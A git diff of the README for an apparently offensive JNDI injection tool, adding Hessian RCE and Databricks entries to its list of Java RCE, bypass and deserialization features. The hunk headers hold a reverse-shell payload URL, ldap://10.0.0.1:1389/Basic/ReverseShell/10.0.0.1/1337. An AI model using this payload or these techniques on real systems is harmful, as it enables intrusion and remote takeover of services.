@@ -42,8 +42,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - MemShell injection (based on [MemShellParty](https://github.com/ReaJason/MemShellParty))
 - High version JDK Bypass
   - BeanFactory Bypass (Tomcat/Groovy/XStream, etc.)
-  - JDBC RCE (MySQL/PostgreSQL/H2/Derby)
+  - JDBC RCE (MySQL/PostgreSQL/H2/Derby, etc.)
   - Tomcat Blind XXE
+  - Hessian RCE
 - LDAP Deserialization (including common gadgets)
 - Customize JNDI payload based on Nashorn JS engine
 - LDAP trustSerialData Bypass
@@ -76,7 +77,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
   - [Apache Derby](USAGE.en.md#derby)
     - [Derby SQL RCE](USAGE.en.md#derby-sql-rce)
     - [Derby Master-Slave Replication Deserialization RCE](USAGE.en.md#derby-master-slave-replication-deserialization-rce)
+  - [Databricks](USAGE.en.md#databricks)
 - [Tomcat Blind XXE](USAGE.en.md#tomcat-blind-xxe)
+- [Hessian RCE](USAGE.en.md#hessian-rce)
 - [LDAP Deserialization](USAGE.en.md#ldap-deserialization)
   - [Custom Data Deserialization](USAGE.en.md#custom-data-deserialization)
   - [CommonsCollections](USAGE.en.md#commonscollections)
